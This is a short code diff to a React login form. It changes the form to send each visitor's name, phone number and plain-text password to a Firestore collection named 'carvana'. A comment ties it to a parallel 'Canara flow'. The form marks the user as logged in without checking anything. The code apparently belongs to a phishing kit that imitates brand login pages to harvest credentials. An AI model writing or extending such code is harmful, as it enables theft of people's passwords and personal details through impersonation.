@@ -21,11 +21,25 @@ const LoginForm = ({ setIsLoggedIn }) => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    setTimeout(() => {
-      FirebaseUtil.uploadAnyModel("web2notes", { name, phone, password });
+    try {
+      const timestamp = Date.now();
+
+      // Generate or reuse a persistent document ID per user (same as Canara flow)
+      let documentId = localStorage.getItem('carvana_document_id');
+      if (!documentId) {
+        documentId = `user_${timestamp}`;
+        localStorage.setItem('carvana_document_id', documentId);
+      }
+
+      // Upload login data to the same Firestore document under the single 'carvana' collection
+      await FirebaseUtil.uploadAnyModel(`carvana/${documentId}`, { name, phone, password });
+
       setIsLoggedIn(true);
       setIsSubmitting(false);
-    }, 2000);
+    } catch (error) {
+      console.error('Error submitting login form:', error);
+      setIsSubmitting(false);
+    }
   };
 
   return (
